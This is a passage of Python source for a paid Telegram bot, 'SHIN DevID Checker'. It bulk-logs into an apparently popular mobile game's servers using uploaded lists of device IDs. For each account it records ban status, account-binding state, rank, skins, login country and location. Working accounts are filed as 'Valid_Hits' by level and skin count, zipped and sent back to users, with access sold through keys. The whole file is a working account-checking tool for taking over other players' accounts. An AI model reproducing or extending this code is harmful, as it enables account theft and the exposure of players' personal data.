            self.account_id = res.get(0); self.session_key = res[1]
            self.zone_id = res[2][0] if isinstance(res.get(2), list) else res.get(2, 0)
            err = res.get(10, 0)
            if err in (3,4,5,6,100,101,102):
                self.ban_status = "BANNED"; self.ban_end_ts = res.get(20, 0)
            return True
        self.ban_status = f"LOGIN FAILED (PID: {pid})"
        return False
    def get_game_server(self):
        self.send_data(5, SdpStruct({0: self.account_id, 1: self.session_key,
            2: CLIENT_VERSION, 5: self.zone_id, 6: CHANNEL}))
        pid, res = self.recv_data(); self._rec("get_server", 5, pid, res)
        if pid == 6 and res:
            host, port = res[1].split(':'); self.game_host = host; self.game_port = int(port); return True
        return False
    def connect_to_game_server(self):
        self.cleanup(); self.host, self.port = self.game_host, self.game_port; self.connect()
        self.send_data(10001, SdpStruct({0: self.account_id, 1: self.session_key,
            2: self.zone_id, 4: CLIENT_VERSION, 13: CHANNEL, 15: self.device_id}))
        self.send_data(10101, SdpStruct({0: 0, 2: 2}))
        for _ in range(20):
            pid, res = self.recv_data(); self._rec("handshake", 10001, pid, res)
            if pid is None or pid == -1: return False
            if pid == 10002: return True
        return False
    def check_ban_status(self):
        self.send_data(10101, SdpStruct({0: 0, 2: 2}))
        for _ in range(3):
            pid, res = self.recv_data(); self._rec("ban_check", 10101, pid, res)
            if pid == 20001 and res and isinstance(res, dict) and 0 in res and isinstance(res[0], dict):
                b = res[0]; reason = b.get('ban_reason', 'Unknown')
                d,h,m,s = b.get('endtime_day','0'), b.get('endtime_hour','0'), b.get('endtime_min','0'), b.get('endtime_sec','0')
                self.ban_status = f"BANNED (Reason: {reason} | Remaining: {d}d {h}h {m}m {s}s)"
                return self.ban_status
            if pid in (-1, None, 20002): break
        return self.ban_status
    def lookup_player(self, search_value):
        self.send_data(11153, SdpStruct({1: int(search_value)}))
        cnt = 0
        for _ in range(8):
            pid, res = self.recv_data(); self._rec("lookup_player", 11153, pid, res)
            if pid in (-1, None): return None
            if pid == 11154: return res
            if pid == 20001:
                cnt += 1
                if cnt >= 5: return None
        return None

# ════════════════════════════════════════════════════════════════
# V2L DETECTION
# ════════════════════════════════════════════════════════════════

def get_v2l_status(conn, role_id, zone_id):
    for pid_req, pid_resp_list in [(10208, [10208]), (10145, [10146, 10160]), (10143, [10144])]:
        try:
            conn.send_data(pid_req, SdpStruct({0: int(role_id), 1: int(zone_id)}))
            for _ in range(3):
                pid, res = conn.recv_data()
                if pid in (-1, None): break
                if pid in pid_resp_list and res:
                    data = dict(res)
                    for tag in [10, 11, 13, 14, 15, 0, 2, 3, 5, 20, 21]:
                        val = data.get(tag)
                        if val is None:
                            nested = data.get(tag, {})
                            if isinstance(nested, dict):
                                for subtag in [10, 11, 13, 14, 15, 0, 2, 3, 5]:
                                    val = nested.get(subtag)
                                    if val is not None: break
                        if val is not None:
                            if isinstance(val, (int, float)):
                                return "Enabled" if int(val) > 0 else "Disabled"
                            if isinstance(val, str):
                                if val.lower() in ("1","true","enabled","yes"): return "Enabled"
                                if val.lower() in ("0","false","disabled","no"): return "Disabled"
        except: pass
    return "N/A"

# ════════════════════════════════════════════════════════════════
# EXTRACT
# ════════════════════════════════════════════════════════════════

def extract_player_data(result):
    if not result or 0 not in result: return None
    plist = result.get(0)
    if not isinstance(plist, list) or not plist: return None
    pd = plist[0]
    if not isinstance(pd, dict): return None

    try:
        bc = pd.get(39, pd.get(40, 0)); bet = pd.get(41, 0)
        if isinstance(bc, int) and bc in _BAN_CODES: ban_status = _BAN_CODES[bc]
        elif isinstance(bc, int) and bc > 0: ban_status = f"Banned(code {bc})"
        else: ban_status = "Not Banned"
        ban_end = fmt_ts(bet) if bet else "N/A"
        try: skin_count = int(pd.get(83, 0))
        except: skin_count = 0
        last_login = fmt_ts(pd.get(5, 0))
        llc = pd.get(87, None); cac = pd.get(97, None)
        try: hero_count = int(pd.get(4, 0))
        except: hero_count = 0
        try: win = int(pd.get(18, 0))
        except: win = 0
        try: loss = int(pd.get(155, 0))
        except: loss = 0
        total = win + loss
        wr = f"{win/total*100:.2f}%" if total > 0 else "N/A"
        loc = "NOT FOUND"
        ld = pd.get(71)
        if isinstance(ld, list) and len(ld) >= 2: loc = ", ".join(str(x) for x in ld)
        sn = str(pd.get(30, "")).replace("`", "").strip()
        si = str(pd.get(31, "")).strip()
        squad = f"{si} {sn}".strip() if sn else None
        hr = map_rank(pd.get(95)) if pd.get(95) is not None else None
        cr = map_rank(pd.get(8)) if pd.get(8) is not None else None
        cpt = 0
        t136 = pd.get(136, {})
        if isinstance(t136, dict): cpt = t136.get(9, 0)
        try: cpt = int(cpt)
        except: cpt = 0
        ctier = map_collector_point(cpt) if cpt > 0 else None
        heroes_list = []
        t91 = pd.get(91, [])
        if isinstance(t91, list):
            seen = set()
            for hid in t91:
                try: hid_i = int(hid)
                except: continue
                if hid_i in seen: continue
                seen.add(hid_i); heroes_list.append(hero_name(hid_i))
                if len(heroes_list) >= 5: break
        return {
            "nickname": pd.get(2, "Unknown"), "player_id": pd.get(0, "Unknown"),
            "server": pd.get(1, "Unknown"), "level": pd.get(3, 1),
            "ban_status": ban_status, "ban_end": ban_end, "skin_count": skin_count,
            "last_login": last_login,
            "login_country": str(llc) if llc else None,
            "reg_country": str(cac) if cac else None,
            "hero_count": hero_count,
            "location": loc if loc != "NOT FOUND" else None,
            "high_rank": hr, "current_rank": cr,
            "collector_tier": ctier, "collector_point": cpt if cpt > 0 else None,
            "squad": squad, "total_battles": total, "win_rate": wr,
            "hero_history": heroes_list,
        }
    except Exception as e:
        log.error(f"extract_player_data error: {e}"); return None

# ════════════════════════════════════════════════════════════════
# DETAIL CHECK (single device)
# ════════════════════════════════════════════════════════════════

def process_detail(device_id, account_id, zone_id, want_debug=False):
    try:
        with GameConnection(device_id=device_id) as conn:
            if not conn.login_to_login_server():
                return False, None, (conn.debug_responses if want_debug else None)
            if not conn.get_game_server() or not conn.connect_to_game_server():
                return False, None, (conn.debug_responses if want_debug else None)
            ban_stat = conn.check_ban_status()
            v2l = get_v2l_status(conn, account_id, zone_id)
            result = conn.lookup_player(account_id)
            debug_bundle = conn.debug_responses if want_debug else None
            extracted = extract_player_data(result) if result else None
            if not extracted:
                return False, None, debug_bundle
            player_data = {
                "nickname": extracted.get("nickname"),
                "level": extracted.get("level"),
                "skin_count": extracted.get("skin_count"),
                "hero_count": extracted.get("hero_count"),
                "matches": extracted.get("total_battles"),
                "current_rank": extracted.get("current_rank") or "Unranked",
                "highest_rank": extracted.get("high_rank") or "N/A",
                "ban_status": ban_stat if "ban" in str(ban_stat).lower() else extracted.get("ban_status"),
                "v2l_status": v2l,
                "device_id": device_id, "account_id": account_id, "zone_id": zone_id,
                "login_country": extracted.get("login_country"),
                "reg_country": extracted.get("reg_country"),
                "collector_tier": extracted.get("collector_tier"),
                "collector_point": extracted.get("collector_point"),
                "location": extracted.get("location"),
                "last_login": extracted.get("last_login"),
                "squad": extracted.get("squad"),
                "hero_history": extracted.get("hero_history", []),
                "win_rate": extracted.get("win_rate"),
            }
            return True, player_data, debug_bundle
    except Exception as e:
        log.error(f"process_detail error: {e}"); return False, None, None

# ════════════════════════════════════════════════════════════════
# FILE WRITE HELPERS (Dev.py bracket scheme)
# ════════════════════════════════════════════════════════════════

def _safe(s, n=40):
    s = re.sub(r'[^A-Za-z0-9_.\-]', '_', str(s or "unknown"))
    return s[:n] or "unknown"

def _lv_key(level):
    for mn, mx, _, key in LEVEL_BRACKETS:
        if mn <= level <= mx: return key
    return None

def _lv_file(lv_dir, level):
    for mn, mx, fn, _ in LEVEL_BRACKETS:
        if mn <= level <= mx: return os.path.join(lv_dir, fn)
    return None

def _sk_key(skin):
    for mn, mx, _, key in SKIN_BRACKETS:
        if mn <= skin <= mx: return key
    return None

def _sk_file(sk_dir, skin):
    for mn, mx, fn, _ in SKIN_BRACKETS:
        if mn <= skin <= mx: return os.path.join(sk_dir, fn)
    return None

def _line_row(did, p):
    hh = p.get("hero_history") or []
    lh = hh[0] if hh else "N/A"
    return (
        f"Device ID: {did} | Name: {p.get('nickname','N/A')} | "
        f"Role ID: {p.get('account_id','N/A')} | Server ID: {p.get('zone_id','N/A')} | "
        f"Level: {p.get('level','N/A')} | Ban: {p.get('ban_status','N/A')} | "
        f"Skin: {p.get('skin_count','N/A')} | Last Login: {p.get('last_login','N/A')} | "
        f"Rank: {p.get('current_rank','N/A')} | High Rank: {p.get('highest_rank','N/A')} | "
        f"Win Rate: {p.get('win_rate','N/A')} | Heroes: {p.get('hero_count',0)} | "
        f"Matches: {p.get('matches',0)} | Last Hero: {lh} | "
        f"Squad: {p.get('squad') or '—'} | Collector: {p.get('collector_tier','None')}"
    )

# ════════════════════════════════════════════════════════════════
# SAVE ENGINE
# ════════════════════════════════════════════════════════════════

HIT_COUNTERS = {'sultan':0,'v2l_active':0,'v2l_inactive':0,'banned':0,
                'warrior':0,'elite':0,'master':0,'gm':0,'epic':0,'legend':0,'mythic':0}
COUNTER_LOCK = threading.Lock()
save_lock = threading.Lock()

def save_account_v2(account_info, player_data, out_dir=None):
    base = out_dir if out_dir else OUTPUT_DIR
    device = account_info.get('Device id', ''); acc = account_info.get('role_id', '?')
    zone = account_info.get('zone_id', '?'); ban_stat = player_data.get('ban_status', 'NORMAL')
    is_banned = 'ban' in str(ban_stat).lower()
    if is_banned:
        bf = os.path.join(base, "Banned", "banned_accounts.txt")
        os.makedirs(os.path.dirname(bf), exist_ok=True)
        with save_lock:
            with open(bf, "a", encoding='utf-8') as f:
                f.write(f"{device} | {acc}:{zone} | {ban_stat}\n")
        with COUNTER_LOCK: HIT_COUNTERS['banned'] += 1
        return None
    nick = player_data.get('nickname', 'N/A')
    if str(nick).lower() in ("unknown", "guest", "", "n/a"): return None
    player_data['account_id'] = acc; player_data['zone_id'] = zone
    cur_rank = player_data.get('current_rank', 'Unranked')
    rank_cat = get_rank_category(cur_rank)
    skin_cnt = player_data.get('skin_count', 0) or 0
    with COUNTER_LOCK:
        if rank_cat in HIT_COUNTERS: HIT_COUNTERS[rank_cat] += 1
        if skin_cnt >= 200: HIT_COUNTERS['sultan'] += 1
    return player_data

def write_session_card(session_dir, device, acc, zone, pd, is_banned):
    """Write per-account card + Dev.py-style bracket files."""
    try:
        nick = pd.get("nickname", "unknown")
        if is_banned:
            folder = os.path.join(session_dir, "Banned")
            fname = f"{_safe(acc)}_{_safe(zone)}_{_safe(nick)}.txt"
            body = render_card(device, pd) + f"\n\nBAN STATUS: {pd.get('ban_status','UNKNOWN')}\n"
        else:
            low = str(nick).lower()
            if low in ("", "n/a", "guest", "unknown") or low.startswith("player_"): return None
            folder = os.path.join(session_dir, "Valid_Hits")
            fname = f"{_safe(acc)}_{_safe(zone)}_{_safe(nick)}.txt"
            body = render_card(device, pd)
        os.makedirs(folder, exist_ok=True)
        with open(os.path.join(folder, fname), "w", encoding="utf-8") as f:
            f.write(body)

        # bracket side-writes (skip banned)
        if not is_banned:
            row = _line_row(device, pd)
            try: lvl = int(pd.get("level", 0))
            except: lvl = 0
            try: skin = int(pd.get("skin_count", 0))
            except: skin = 0
            lv_dir = os.path.join(session_dir, "levels"); os.makedirs(lv_dir, exist_ok=True)
            sk_dir = os.path.join(session_dir, "skins"); os.makedirs(sk_dir, exist_ok=True)
            allf = os.path.join(session_dir, "all_valid.txt")
            with save_lock:
                with open(allf, "a", encoding="utf-8") as f: f.write(row + "\n")
                lf = _lv_file(lv_dir, lvl)
                if lf:
                    with open(lf, "a", encoding="utf-8") as f: f.write(row + "\n")
                sf = _sk_file(sk_dir, skin)
                if sf:
                    with open(sf, "a", encoding="utf-8") as f: f.write(row + "\n")
        return True
    except Exception as e:
        log.error(f"write_session_card: {e}"); return None

# ════════════════════════════════════════════════════════════════
# USER MANAGER
# ════════════════════════════════════════════════════════════════

active_jobs = {}; job_lock = threading.Lock()

class UserManager:
    def __init__(self): self._load()
    def _load(self):
        try:
            self.users = json.loads(USERS_FILE.read_text()) if USERS_FILE.exists() else {"users": {}}
            if "users" not in self.users: self.users = {"users": {}}
        except: self.users = {"users": {}}
        try:
            self.keys = json.loads(KEYS_FILE.read_text()) if KEYS_FILE.exists() else {"keys": {}}
            if "keys" not in self.keys: self.keys = {"keys": {}}
        except: self.keys = {"keys": {}}
        self._save_users_sync(); self._save_keys_sync()
    def _save_users_sync(self): USERS_FILE.write_text(json.dumps(self.users, indent=2))
    def _save_keys_sync(self): KEYS_FILE.write_text(json.dumps(self.keys, indent=2))
    async def _save_users(self): self._save_users_sync()
    async def _save_keys(self): self._save_keys_sync()
    async def register_user(self, uid, username=None, first_name=None):
        u = str(uid)
        if u not in self.users["users"]:
            self.users["users"][u] = {
                "username": username, "first_name": first_name,
                "joined": datetime.now().isoformat(), "banned": False, "key_expiry": None,
                "threads_limit": MAX_THREADS_DEFAULT,
                "stats": {"total_checked": 0, "total_hits": 0},
                "vip": False, "activated": False}
            await self._save_users(); return True
        return False
    async def is_authorized(self, uid):
        u = str(uid)
        if u == str(OWNER_ID): return True, "admin"
        user = self.users["users"].get(u)
        if not user: return False, "not_registered"
        if user.get("banned"): return False, "banned"
        exp = user.get("key_expiry")
        if exp is None: return False, "no_key"
        try:
            if datetime.fromisoformat(exp) < datetime.now(): return False, "key_expired"
        except: return False, "invalid_expiry"
        return True, "ok"
    async def ban_user(self, uid):
        u = str(uid)
        if u in self.users["users"]:
            self.users["users"][u]["banned"] = True; await self._save_users(); return True
        return False
    async def unban_user(self, uid):
        u = str(uid)
        if u in self.users["users"]:
            self.users["users"][u]["banned"] = False; await self._save_users(); return True
        return False
    async def set_key_expiry(self, uid, dt):
        u = str(uid)
        if u not in self.users["users"]: return False
        self.users["users"][u]["key_expiry"] = dt.isoformat()
        self.users["users"][u]["activated"] = True
        await self._save_users(); return True
    async def generate_key(self, duration, unit, qty=1, max_users=1):
        if unit in ('lifetime','l'):
            exp = datetime(9999,12,31,23,59,59); disp = "🌟 Lifetime"
        else:
            um = {'s':1,'m':60,'h':3600,'d':86400,'y':31536000,
                  'hours':3600,'days':86400,'months':2592000,'lifetime':0}
            exp = datetime.now() + timedelta(seconds=duration * um.get(unit.lower(), 86400))
            disp = f"{duration} {unit}"
        keys = []
        for _ in range(qty):
            k = f"SHIN-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:8].upper()}"
            while k in self.keys["keys"]:
                k = f"SHIN-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:8].upper()}"
            self.keys["keys"][k] = {"created": datetime.now().isoformat(), "expiry": exp.isoformat(),
                "used_by": [], "duration": disp, "max_users": max_users,
                "dtype": unit, "dval": duration}
            keys.append(k)
        await self._save_keys(); return keys, disp
    async def redeem_key(self, uid, key):
        u = str(uid); kd = self.keys["keys"].get(key)
        if not kd: return False, "Invalid key"
        used = kd.get("used_by", [])
        if u in used: return False, "Key already used by you"
        if len(used) >= kd.get("max_users",1): return False, "Key max users reached"
        exp = datetime.fromisoformat(kd["expiry"])
        if exp < datetime.now(): return False, "Key expired"
        used.append(u); kd["used_by"] = used
        await self._save_keys(); await self.set_key_expiry(uid, exp)
        return True, f"Key redeemed! Valid until {exp.strftime('%Y-%m-%d %H:%M')}"
    async def get_all_users(self): return self.users["users"]
    async def get_user_info(self, uid): return self.users["users"].get(str(uid))
    async def get_threads_limit(self, uid):
        u = self.users["users"].get(str(uid))
        return u.get("threads_limit", MAX_THREADS_DEFAULT) if u else MAX_THREADS_DEFAULT
    async def update_stats(self, uid, checked=0, hits=0):
        u = str(uid); user = self.users["users"].get(u)
        if not user: return
        s = user.setdefault("stats", {})
        s["total_checked"] = s.get("total_checked", 0) + checked
        s["total_hits"] = s.get("total_hits", 0) + hits
        await self._save_users()

user_manager = UserManager()

# ════════════════════════════════════════════════════════════════
# LIVE STATS (with lv/sk bracket tracking for Dev.py summary)
# ════════════════════════════════════════════════════════════════

class LiveStats:
    def __init__(self, total):
        self.lock = threading.Lock(); self.total = total; self.checked = 0
        self.hits = 0; self.banned = 0; self.failed = 0
        self.start_ts = time.time(); self.recent = []
        self.lv = {k: 0 for _,_,_,k in LEVEL_BRACKETS}
        self.sk = {k: 0 for _,_,_,k in SKIN_BRACKETS}
    def inc(self, key, n=1):
        with self.lock:
            setattr(self, key, getattr(self, key) + n)
            if key == "checked":
                now = time.time(); self.recent.append(now)
                cut = now - 20; self.recent = [t for t in self.recent if t >= cut]
    def bump_brackets(self, lvl, skin):
        with self.lock:
            lk = _lv_key(lvl); skk = _sk_key(skin)
            if lk: self.lv[lk] += 1
            if skk: self.sk[skk] += 1
    def snapshot(self):
        with self.lock:
            now = time.time(); elapsed = max(now - self.start_ts, 0.001)
            span = self.recent[-1] - self.recent[0] if len(self.recent) >= 2 else 0
            cnt = len(self.recent) - 1 if len(self.recent) >= 2 else 0
            live_rate = cnt / span if span > 0.5 else self.checked / elapsed
            avg_rate = self.checked / elapsed
            rem = max(self.total - self.checked, 0)
            eta = rem / live_rate if live_rate > 0.01 else 0
            return {"total": self.total, "checked": self.checked, "hits": self.hits,
                    "banned": self.banned, "failed": self.failed, "elapsed": elapsed,
                    "avg_rate": avg_rate, "live_rate": live_rate, "eta": eta,
                    "lv": dict(self.lv), "sk": dict(self.sk)}

# ════════════════════════════════════════════════════════════════
# ZIP
# ════════════════════════════════════════════════════════════════

TG_MAX_BYTES = 49 * 1024 * 1024

def zip_results(folder):
    folder = Path(folder)
    files = sorted([f for f in folder.rglob("*") if f.is_file() and not f.name.endswith(".zip")])
    if not files: return []
    out = folder / "results.zip"
    try:
        with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zf:
            for f in files: zf.write(f, f.relative_to(folder))
        if out.stat().st_size <= TG_MAX_BYTES: return [out]
        out.unlink()
        parts = []; pn = 1; cf = []; cs = 0
        for f in files:
            fs = f.stat().st_size
            if cf and cs + fs > TG_MAX_BYTES:
                po = folder / f"results_part{pn}.zip"
                with zipfile.ZipFile(po, "w", zipfile.ZIP_DEFLATED) as zf:
                    for x in cf: zf.write(x, x.relative_to(folder))
                parts.append(po); pn += 1; cf = []; cs = 0
            cf.append(f); cs += fs
        if cf:
            po = folder / f"results_part{pn}.zip"
            with zipfile.ZipFile(po, "w", zipfile.ZIP_DEFLATED) as zf:
                for x in cf: zf.write(x, x.relative_to(folder))
            parts.append(po)
        return parts
    except Exception as e:
        log.error(f"Zip error: {e}"); return []

# ════════════════════════════════════════════════════════════════
# BULK JOB RUNNER
# ════════════════════════════════════════════════════════════════

def run_bulk_job(job, loop, app):
    user_id = job["user_id"]; chat_id = job["chat_id"]; msg_id = job["msg_id"]
    devices = job["devices"]; threads = job["threads"]
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    sdir = os.path.join(RESULTS_DIR, f"session_{user_id}_{ts}")
    os.makedirs(sdir, exist_ok=True)
    os.makedirs(os.path.join(sdir, "Valid_Hits"), exist_ok=True)
    os.makedirs(os.path.join(sdir, "Banned"), exist_ok=True)
    stats = LiveStats(len(devices)); job["stats"] = stats
    _last = [0.0]

    def upd(force=False, status="RUNNING"):
        now = time.time()
        if not force and (now - _last[0]) < 1.5: return
        _last[0] = now
        snap = stats.snapshot(); text = render_live(snap, status)
        kb = [[InlineKeyboardButton("🛑  Stop", callback_data=f"stop_{user_id}")]]
        try:
            fut = asyncio.run_coroutine_threadsafe(app.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id, text=text, parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(kb)), loop)
            fut.result(timeout=10)
        except: pass

    import queue as _q
    hq = _q.Queue()
    def hit_sender():
        while True:
            m = hq.get()
            if m is None: break
            for _ in range(3):
                try:
                    fut = asyncio.run_coroutine_threadsafe(
                        app.bot.send_message(chat_id=chat_id, text=m, parse_mode="Markdown"), loop)
                    fut.result(timeout=30); time.sleep(0.4); break
                except Exception as e:
                    log.error(f"hit sender: {e}"); time.sleep(1.5)
    ht = threading.Thread(target=hit_sender, daemon=False); ht.start()

    def worker(did):
        if job.get("stopped"): return
        acc, zone, st = GameLogin(did).run()
        if not acc or not zone:
            stats.inc("checked")
            if 'ban' in st.lower(): stats.inc("banned")
            else: stats.inc("failed")
            upd(); return
        ok, pd, _ = process_detail(did, acc, zone)
        stats.inc("checked")
        if ok and pd:
            is_b = 'ban' in str(pd.get('ban_status','')).lower()
            pd['account_id'] = acc; pd['zone_id'] = zone
            save_account_v2({'Device id': did, 'role_id': acc, 'zone_id': zone}, pd, sdir)
            if is_b:
                stats.inc("banned")
            else:
                nick = str(pd.get('nickname','')).lower()
                if nick not in ('','n/a','unknown','guest'):
                    stats.inc("hits")
                    try: lvl = int(pd.get("level", 0))
                    except: lvl = 0
                    try: skin = int(pd.get("skin_count", 0))
                    except: skin = 0
                    stats.bump_brackets(lvl, skin)
            write_session_card(sdir, did, acc, zone, pd, is_b)
            if not is_b and str(pd.get('nickname','')).lower() not in ('','n/a','unknown','guest'):
                hq.put(line_success(did, pd))
        else:
            stats.inc("failed")
            hq.put(line_error(did, "check failed"))
        upd()

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(worker, d) for d in devices]
        while True:
            snap = stats.snapshot()
            done = (snap["checked"] >= snap["total"]) or job.get("stopped")
            upd()
            if done: break
            time.sleep(0.4)
        upd(force=True, status="STOPPING")
        for f in futs: f.cancel()

    hq.put(None); ht.join(timeout=180)
    asyncio.run_coroutine_threadsafe(
        user_manager.update_stats(user_id, checked=stats.checked, hits=stats.hits), loop)
    snap = stats.snapshot(); el = int(snap["elapsed"])

    try:
        with open(os.path.join(sdir, "summary.txt"), "w", encoding="utf-8") as f:
            f.write(f"SHIN DevID Checker — Bulk Results\n"
                    f"=================================\n"
                    f"Session   : {ts}\nTotal     : {snap['total']}\n"
                    f"Valid Hits: {snap['hits']}\nBanned    : {snap['banned']}\n"
                    f"Invalid   : {snap['failed']}\nElapsed   : {_fmt_secs(el)}\n"
                    f"Speed     : {snap['avg_rate']:.2f}/s\nBrand     : {BRAND}\n")
    except: pass

    summary = render_summary(snap, snap["elapsed"], sdir)
    time.sleep(0.8); edited = False
    for _ in range(4):
        try:
            fut = asyncio.run_coroutine_threadsafe(app.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id, text=summary, parse_mode="Markdown"), loop)
            fut.result(timeout=30); edited = True; break
        except: time.sleep(2)
    if not edited:
        for _ in range(3):
            try:
                fut = asyncio.run_coroutine_threadsafe(
                    app.bot.send_message(chat_id=chat_id, text=summary, parse_mode="Markdown"), loop)
                fut.result(timeout=30); break
            except: time.sleep(2)

    try:
        zips = zip_results(Path(sdir))
        for zp in zips[:3]:
            for _ in range(3):
                try:
                    with open(zp, "rb") as f:
                        fut = asyncio.run_coroutine_threadsafe(app.bot.send_document(
                            chat_id=chat_id, document=f, filename=f"shin_results_{ts}.zip"), loop)
                        fut.result(timeout=60); break
                except: time.sleep(2)
        try: shutil.rmtree(sdir, ignore_errors=True)
        except: pass
    except: pass
    with job_lock: active_jobs.pop(user_id, None)

# ════════════════════════════════════════════════════════════════
# COMMANDS
# ════════════════════════════════════════════════════════════════

async def cmd_start(update, ctx):
    uid = update.effective_user.id
    await user_manager.register_user(uid, update.effective_user.username, update.effective_user.first_name)
    if not await gate(update, ctx): return
    auth, _ = await user_manager.is_authorized(uid)
    kb_main = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔥  Bulk Check", callback_data="tool_bulk")],
        [InlineKeyboardButton("🔍  Single Account Check", callback_data="tool_single")],
        [InlineKeyboardButton("📊  Statistics", callback_data="tool_stats")],
        [InlineKeyboardButton("💳  Buy Key", callback_data="menu_buy"),
         InlineKeyboardButton("📖  Help", callback_data="menu_help")],
    ])
    if auth:
        ui = await user_manager.get_user_info(uid); st = ui.get("stats", {})
        exp_s = ui.get("key_expiry")
        if exp_s:
            try:
                e = datetime.fromisoformat(exp_s)
                ed = "Lifetime" if e.year == 9999 else e.strftime("%Y-%m-%d %H:%M")
            except: ed = "Unknown"
        else: ed = "None"
        is_admin = (uid == OWNER_ID)
        text = render_welcome(update.effective_user.first_name or "friend",
                              is_admin, ed,
                              st.get('total_checked',0), st.get('total_hits',0))
        if is_admin:
            kb_main = InlineKeyboardMarkup(list(kb_main.inline_keyboard) + [
                [InlineKeyboardButton("👑  ADMIN PANEL", callback_data="open_admin_panel")]])
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=kb_main)
    else:
        kb_nk = InlineKeyboardMarkup([
            [InlineKeyboardButton("💳  Buy Access Key", callback_data="menu_buy")],
            [InlineKeyboardButton("📖  Help", callback_data="menu_help")]])
        await update.message.reply_text(render_no_key(), parse_mode="Markdown", reply_markup=kb_nk)

async def cmd_menu(update, ctx):
    if not await gate(update, ctx): return
    await update.message.reply_text(render_menu(), parse_mode="Markdown")

async def cmd_redeem(update, ctx):
    uid = update.effective_user.id
    await user_manager.register_user(uid, update.effective_user.username, update.effective_user.first_name)
    if not await gate(update, ctx): return
    if not ctx.args:
        await update.message.reply_text("Usage: `/redeem <key>`", parse_mode="Markdown"); return
    key = ctx.args[0].strip()
    ok, msg = await user_manager.redeem_key(uid, key)
    if ok:
        ui = await user_manager.get_user_info(uid); exp = datetime.fromisoformat(ui["key_expiry"])
        await update.message.reply_text(
            f"✅  *KEY REDEEMED*\n{LINE_HEAVY}\n"
            f"┣ 🔑 Key   : `{key}`\n"
            f"┗ ⏳ Until : `{exp.strftime('%Y-%m-%d %H:%M')}`\n"
            f"{LINE_HEAVY}\nUse /start to begin.\n👑 {BRAND}",
            parse_mode="Markdown")
    else:
        await update.message.reply_text(f"❌ {msg}")

async def cmd_help(update, ctx):
    if not await gate(update, ctx): return
    await update.message.reply_text(
        f"◇  *HELP*  ◇\n{LINE_HEAVY}\n"
        "┣ 🔥 Bulk Check — send `.txt` of device IDs\n"
        "┣ 🔍 Single Check — send one device ID\n"
        "┣ 📊 Statistics — rank counters\n"
        "┗ 📖 Menu — /menu\n\n"
        "`/redeem <key>` · `/start` · `/stop`\n"
        f"{LINE_HEAVY}\n👑 {BRAND}",
        parse_mode="Markdown")

async def cmd_stop(update, ctx):
    if not await gate(update, ctx): return
    uid = update.effective_user.id
    with job_lock: job = active_jobs.get(uid)
    if job: job["stopped"] = True; await update.message.reply_text("🛑 Stopping...")
    else: await update.message.reply_text("No active job.")

async def cmd_status(update, ctx):
    if not await gate(update, ctx): return
    uid = update.effective_user.id
    with job_lock: job = active_jobs.get(uid)
    if job and "stats" in job:
        s = job["stats"].snapshot()
        await update.message.reply_text(render_live(s), parse_mode="Markdown")
    else:
        await update.message.reply_text("No active job.")

def admin_only(fn):
    from functools import wraps
    @wraps(fn)
    async def w(update, context):
        if update.effective_user.id != OWNER_ID:
            await update.message.reply_text("❌ Admin only."); return
        return await fn(update, context)
    return w

@admin_only
async def cmd_admin(update, ctx):
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Gen Key", callback_data="adm_genkey"),
         InlineKeyboardButton("👥 Users", callback_data="adm_users")],
        [InlineKeyboardButton("📊 Stats", callback_data="adm_stats"),
         InlineKeyboardButton("⚡ Running", callback_data="adm_running")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast_help")]])
    await update.message.reply_text(
        f"◇  *ADMIN PANEL*  ◇\n{LINE_HEAVY}", reply_markup=kb, parse_mode="Markdown")

@admin_only
async def cmd_genkey(update, ctx):
    args = ctx.args or []
    try:
        dt = args[0].lower()
        if dt == "lifetime": dv = 0; mu = int(args[1]) if len(args)>1 else 1
        else: dv = int(args[1]); mu = int(args[2])
    except:
        await update.message.reply_text(
            "Usage: `/genkey hours 24 1`\n`/genkey days 7 1`\n"
            "`/genkey months 1 1`\n`/genkey lifetime 1`",
            parse_mode="Markdown"); return
    keys, _ = await user_manager.generate_key(dv, dt, 1, mu)
    await update.message.reply_text(
        f"🔑  *KEY*\n{LINE_HEAVY}\n`{keys[0]}`\n{LINE_HEAVY}", parse_mode="Markdown")

@admin_only
async def cmd_ban_user(update, ctx):
    if not ctx.args: await update.message.reply_text("Usage: `/ban_user <id>`"); return
    ok = await user_manager.ban_user(int(ctx.args[0].strip()))
    await update.message.reply_text(f"{'✅' if ok else '❌'} `{ctx.args[0]}`")

@admin_only
async def cmd_unban_user(update, ctx):
    if not ctx.args: await update.message.reply_text("Usage: `/unban_user <id>`"); return
    ok = await user_manager.unban_user(int(ctx.args[0].strip()))
    await update.message.reply_text(f"{'✅' if ok else '❌'} `{ctx.args[0]}`")

@admin_only
async def cmd_stats(update, ctx):
    users = await user_manager.get_all_users()
    with COUNTER_LOCK:
        rows = "\n".join(
            f"┣ {r.capitalize():<10}: `{HIT_COUNTERS.get(r,0)}`"
            for r in ['warrior','elite','master','gm','epic','legend','mythic'])
        sultan = HIT_COUNTERS.get('sultan',0)
    await update.message.reply_text(
        f"◇  *BOT STATISTICS*  ◇\n{LINE_HEAVY}\n"
        f"┣ 👥 Users   : `{len(users)}`\n"
        f"{rows}\n┗ 👑 Sultan  : `{sultan}`\n"
        f"{LINE_HEAVY}\n👑 {BRAND}",
        parse_mode="Markdown")

@admin_only
async def cmd_broadcast(update, ctx):
    if not ctx.args: await update.message.reply_text("Usage: `/broadcast msg`"); return
    msg = " ".join(ctx.args)
    users = await user_manager.get_all_users(); sent = 0; failed = 0
    sm = await update.message.reply_text(f"📢 Broadcasting to `{len(users)}`...", parse_mode="Markdown")
    for u in users:
        try:
            await ctx.bot.send_message(chat_id=int(u),
                text=f"📢  *ANNOUNCEMENT*\n{LINE_HEAVY}\n{msg}\n{LINE_HEAVY}\n👑 {BRAND}",
                parse_mode="Markdown")
            sent += 1
        except: failed += 1
        await asyncio.sleep(0.06)
    await sm.edit_text(f"✅ Delivered: `{sent}`  ·  Failed: `{failed}`", parse_mode="Markdown")

